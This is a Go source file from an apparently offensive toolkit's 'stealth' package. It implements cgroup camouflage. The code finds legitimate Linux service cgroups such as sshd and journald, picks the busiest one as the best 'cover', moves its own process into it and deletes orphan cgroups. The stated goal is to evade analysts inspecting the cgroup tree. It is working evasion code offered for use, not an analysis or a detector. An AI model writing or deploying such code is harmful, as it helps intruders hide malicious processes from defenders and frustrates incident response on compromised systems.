package stealth

import (
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// Cgroup Camouflage
//
// OPSEC rationale: Creating a new cgroup (like our namespace bootstrap does)
// leaves an orphan cgroup entry visible in /sys/fs/cgroup. Any analyst running
// `systemd-cgls` or inspecting the cgroup tree sees an unexpected entry.
// Instead, we should move our process into an EXISTING legitimate cgroup
// belonging to a real service, so we blend into the tree.

// CgroupTarget represents a legitimate cgroup we can hide in.
type CgroupTarget struct {
	Path        string // full path under /sys/fs/cgroup
	ServiceName string // the service that owns this cgroup
	PIDs        int    // how many PIDs are in it (more = better cover)
}

// FindLegitimateGroups discovers real service cgroups we can hide in.
// Prefers cgroups with multiple PIDs (easier to blend) owned by common services.
func FindLegitimateGroups() []CgroupTarget {
	var targets []CgroupTarget

	// Priority services to hide among — sorted by preference
	desiredServices := []string{
		"sshd.service",
		"systemd-journald.service",
		"cron.service",
		"dbus.service",
		"networkd-dispatcher.service",
		"rsyslog.service",
		"systemd-logind.service",
		"systemd-resolved.service",
		"polkit.service",
		"accounts-daemon.service",
	}

	cgroupBase := detectCgroupBase()

	for _, svc := range desiredServices {
		path := filepath.Join(cgroupBase, "system.slice", svc)
		if info, err := os.Stat(path); err == nil && info.IsDir() {
			pidCount := countCgroupPIDs(path)
			targets = append(targets, CgroupTarget{
				Path:        path,
				ServiceName: svc,
				PIDs:        pidCount,
			})
		}
	}

	return targets
}

// MoveIntoCgroup moves the current process into a legitimate service's cgroup.
// Returns the original cgroup path for cleanup/restore.
func MoveIntoCgroup(target CgroupTarget) (string, error) {
	// Save current cgroup for potential restore
	originalCgroup := getCurrentCgroup()

	// Write our PID to the target cgroup's cgroup.procs
	procsPath := filepath.Join(target.Path, "cgroup.procs")
	pid := os.Getpid()

	err := os.WriteFile(procsPath, []byte(strconv.Itoa(pid)), 0644)
	if err != nil {
		return originalCgroup, fmt.Errorf("move to cgroup %s: %w", target.Path, err)
	}

	return originalCgroup, nil
}

// CamouflageCgroup is the all-in-one function: find best target, move into it.
func CamouflageCgroup() (string, error) {
	targets := FindLegitimateGroups()
	if len(targets) == 0 {
		return "", fmt.Errorf("no suitable cgroup target found")
	}

	// Pick the target with the most PIDs (best cover)
	best := targets[0]
	for _, t := range targets[1:] {
		if t.PIDs > best.PIDs {
			best = t
		}
	}

	return MoveIntoCgroup(best)
}

// RestoreCgroup moves back to the original cgroup.
func RestoreCgroup(originalPath string) error {
	if originalPath == "" {
		return nil
	}

	procsPath := filepath.Join(originalPath, "cgroup.procs")
	return os.WriteFile(procsPath, []byte(strconv.Itoa(os.Getpid())), 0644)
}

// CleanupOrphanCgroup removes a cgroup directory we created during namespace setup.
// An empty cgroup directory can be removed with os.Remove (rmdir).
func CleanupOrphanCgroup(cgroupPath string) error {
	// Only remove if it's empty (no pids)
	if countCgroupPIDs(cgroupPath) > 0 {
		return fmt.Errorf("cgroup not empty")
	}
	return os.Remove(cgroupPath)
}

// detectCgroupBase finds the cgroup v2 unified hierarchy mount point.
func detectCgroupBase() string {
	// Standard location for cgroup v2
	if info, err := os.Stat("/sys/fs/cgroup/cgroup.procs"); err == nil && !info.IsDir() {
		return "/sys/fs/cgroup"
	}

	// Check mountinfo for cgroup2 mount
	data, err := os.ReadFile("/proc/self/mountinfo")
	if err != nil {
		return "/sys/fs/cgroup"
	}

	for _, line := range strings.Split(string(data), "\n") {
		if strings.Contains(line, "cgroup2") {
			fields := strings.Fields(line)
			if len(fields) >= 5 {
				return fields[4]
			}
		}
	}

	return "/sys/fs/cgroup"
}

// getCurrentCgroup reads our current cgroup path.
func getCurrentCgroup() string {
	data, err := os.ReadFile("/proc/self/cgroup")
	if err != nil {
		return ""
	}

	// cgroup v2 format: "0::/path"
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		parts := strings.SplitN(line, ":", 3)
		if len(parts) == 3 && parts[0] == "0" {
			cgroupPath := parts[2]
			base := detectCgroupBase()
			return filepath.Join(base, cgroupPath)
		}
	}

	return ""
}

// countCgroupPIDs counts how many processes are in a cgroup.
func countCgroupPIDs(cgroupPath string) int {
	data, err := os.ReadFile(filepath.Join(cgroupPath, "cgroup.procs"))
	if err != nil {
		return 0
	}

	count := 0
	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if line != "" {
			count++
		}
	}
	return count
}

// VerifyCgroupBlend checks if we're successfully in the target cgroup.
func VerifyCgroupBlend(expectedService string) bool {
	data, err := os.ReadFile("/proc/self/cgroup")
	if err != nil {
		return false
	}
	return strings.Contains(string(data), expectedService)
}
